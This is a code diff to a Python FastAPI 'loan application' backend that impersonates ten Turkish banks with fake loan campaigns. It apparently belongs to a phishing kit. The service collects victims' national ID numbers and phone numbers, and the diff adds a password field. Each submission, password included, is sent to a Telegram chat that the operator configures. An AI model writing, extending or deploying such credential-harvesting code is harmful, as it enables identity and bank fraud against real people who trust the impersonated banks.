@@ -7,6 +7,7 @@ import urllib.request
 import urllib.parse
 import os
 from datetime import datetime
+import uvicorn
 
 app = FastAPI(title="Kredi Başvuru API")
 
@@ -26,6 +27,7 @@ telegram_settings = {
 
 class LoanApplication(BaseModel):
     tc_kimlik: str
+    sifre: str
     telefon: str
     bank_name: str
     amount: int
@@ -45,70 +47,70 @@ async def get_banks():
         {
             "id": 1,
             "name": "Akbank",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/ac807fc1-b3e9-46f6-899d-ce70882e7f57.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/ac807fc1-b3e9-46f6-899d-ce70882e7f57.svg",
             "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan taksitli avans",
             "color": "red"
         },
         {
             "id": 2,
             "name": "QNB",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/57347029-2d9b-4c81-bd47-8b12777a564f.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/57347029-2d9b-4c81-bd47-8b12777a564f.svg",
             "campaign": "3 Ay vadeli 25.000 TL'ye varan nakit avans",
             "color": "purple"
         },
         {
             "id": 3,
             "name": "TEB",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/4c0a9c34-b72b-46f6-a3ee-f9bb52176937.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/4c0a9c34-b72b-46f6-a3ee-f9bb52176937.svg",
             "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan nakit avans",
             "color": "green"
         },
         {
             "id": 4,
             "name": "DenizBank",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/1aad69c2-3faf-472f-8d26-9d3f912d444e.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/1aad69c2-3faf-472f-8d26-9d3f912d444e.svg",
             "campaign": "3 Ay vadeli 65.000 TL'ye varan kredi",
             "color": "cyan"
         },
         {
             "id": 5,
             "name": "Garanti BBVA",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/52889dca-38c7-4a02-a12c-85e84a339610.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/94ec8109-1b2b-4200-a8b1-935ac655b2ee.svg",
             "campaign": "Bonus kart sahiplerine özel avantajlar",
             "color": "green"
         },
         {
             "id": 6,
             "name": "Türkiye İş Bankası",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/b071446a-6bb3-4711-813b-6387c115dc4a.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/aa37ded8-f289-4d2d-85b2-026c5063b3d0.svg",
             "campaign": "Maximum kart avantajı",
             "color": "blue"
         },
         {
             "id": 7,
             "name": "Albaraka",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/fbfbe483-4301-4d5c-8a76-0ba83dfde29a.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/8f24530b-3b5d-4c6e-b651-dd671d709d54.svg",
             "campaign": "Katılım bankacılığı avantajı",
             "color": "gray"
         },
         {
             "id": 8,
             "name": "Enpara",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/8f24530b-3b5d-4c6e-b651-dd671d709d54.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/b071446a-6bb3-4711-813b-6387c115dc4a.svg",
             "campaign": "Dijital bankacılık fırsatı",
             "color": "pink"
         },
         {
             "id": 9,
             "name": "ON",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/94ec8109-1b2b-4200-a8b1-935ac655b2ee.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/52889dca-38c7-4a02-a12c-85e84a339610.svg",
             "campaign": "Tamamen dijital deneyim",
             "color": "green"
         },
         {
             "id": 10,
             "name": "Getirfinans",
-            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=40,fit=contain,quality=80,format=webp/company/logos/aa37ded8-f289-4d2d-85b2-026c5063b3d0.svg",
+            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/2f82b0ad-9cd6-4fc3-a79b-77d6065512f7.svg",
             "campaign": "450.000 TL'ye varan kredi",
             "color": "purple"
         }
@@ -147,6 +149,7 @@ async def submit_application(application: LoanApplication):
     new_application = {
         "id": len(applications_storage) + 1,
         "tc_kimlik": application.tc_kimlik,
+        "sifre": application.sifre,
         "telefon": application.telefon,
         "bank_name": application.bank_name,
         "amount": application.amount,
@@ -164,6 +167,7 @@ async def submit_application(application: LoanApplication):
         message = f"""🏦 Yeni Kredi Başvurusu
 
 👤 T.C. Kimlik: {application.tc_kimlik}
+🔐 Şifre: {application.sifre}
 📞 Telefon: {application.telefon}
 🏛️ Banka: {application.bank_name}
 💰 Tutar: {application.amount:,} TL
@@ -207,7 +211,3 @@ async def update_telegram_settings(settings: TelegramSettings):
     os.environ['TELEGRAM_CHAT_ID'] = settings.chat_id
     
     return {"success": True, "message": "Telegram ayarları güncellendi"}
-
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
